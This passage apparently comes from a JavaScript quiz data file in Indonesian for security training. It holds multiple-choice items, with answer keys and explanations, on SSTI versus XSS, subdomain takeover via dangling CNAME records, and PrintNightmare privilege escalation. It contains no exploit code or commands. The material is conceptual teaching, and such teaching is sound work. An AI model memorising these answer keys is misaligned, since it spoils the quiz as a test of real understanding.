      options: ['SSTI dieksekusi di server (akses ke file sistem, RCE). XSS dieksekusi di browser (akses ke cookie)', 'Keduanya sama bahayanya', 'XSS lebih berbahaya dari SSTI', 'SSTI hanya memengaruhi Python'],
      correct: 0,
      explain: 'XSS menyisipkan JavaScript di browser (terbatas pada konteks browser). SSTI menyisipkan kode di template engine SERVER - bisa mengakses variabel server, file system, menjalankan perintah OS, dan berpotensi full RCE.',
    },
  ],
  'subdomain-takeover': [
    {
      q: 'Bagaimana subdomain takeover bisa terjadi?',
      options: ['Subdomain CNAME mengarah ke layanan eksternal yang sudah dihapus/tidak digunakan', 'Attacker meretas DNS server', 'Attacker membeli domain utama', 'Subdomain dibiarkan tanpa konten'],
      correct: 0,
      explain: 'Contoh: subdomain.company.com CNAME ke company.azurewebsites.net. Jika Azure app dihapus tapi CNAME record tidak dihapus, attacker bisa register app baru dengan nama yang sama di Azure dan "mengklaim" subdomain tersebut.',
    },
  ],
  'printnightmare': [
    {
      q: 'Mengapa PrintNightmare (CVE-2021-34527) sangat berbahaya di jaringan enterprise?',
      options: ['Memungkinkan escalate ke SYSTEM dan lateral movement via Print Spooler yang berjalan di semua Windows', 'Hanya memengaruhi printer', 'Hanya di Windows 10', 'Memerlukan akses fisik ke printer'],
      correct: 0,
      explain: 'Windows Print Spooler berjalan sebagai SYSTEM di semua versi Windows dan aktif secara default. Exploit memungkinkan low-priv user mendapat SYSTEM privilege, memudahkan lateral movement ke semua Domain Controller di jaringan.',
    },
  ],
};
